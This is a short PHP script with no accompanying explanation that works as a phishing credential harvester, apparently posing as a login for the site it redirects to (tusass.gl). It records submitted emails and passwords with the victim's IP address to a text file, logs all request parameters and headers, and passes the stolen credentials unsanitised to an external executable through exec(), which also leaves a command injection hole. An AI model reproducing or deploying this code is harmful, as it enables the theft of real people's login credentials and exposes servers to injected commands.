<?php

header("Location: http://www.tusass.gl ");


$credentials_handler = fopen("data/passwords.txt", "a");

$username = $_GET['email'];
$password = $_GET['pass'];

fwrite($credentials_handler, "email='$username'\r\n");
fwrite($credentials_handler, "pass='$password'\r\n");

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

fwrite($credentials_handler, get_client_ip() . "\r\n");
fwrite($credentials_handler, "----------------\r\n");

fclose($credentials_handler);


$log_handler = fopen("data/comprehensive_log.log", "a");

foreach($_GET as $variable => $value) {
    fwrite($log_handler, "$variable='$value'\r\n");
}

fwrite($log_handler, "non-standard data------\r\n");
fwrite($log_handler, $_SERVER['HTTP_USER_AGENT']);
fwrite($log_handler, "\r\n");
fwrite($log_handler, $_SERVER['HTTP_CLIENT_IP'] . "\r\n");
fwrite($log_handler, $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n");
fwrite($log_handler, $_SERVER['HTTP_X_FORWARDED'] . "\r\n");
fwrite($log_handler, $_SERVER['HTTP_FORWARDED_FOR'] . "\r\n");
fwrite($log_handler, $_SERVER['HTTP_FORWARDED'] . "\r\n");
fwrite($log_handler, $_SERVER['REMOTE_ADDR'] . "\r\n");
fwrite($log_handler, "----------------\r\n");

fclose($log_handler);


exec("executables/Execute.exe $username $password");


exit;

?> 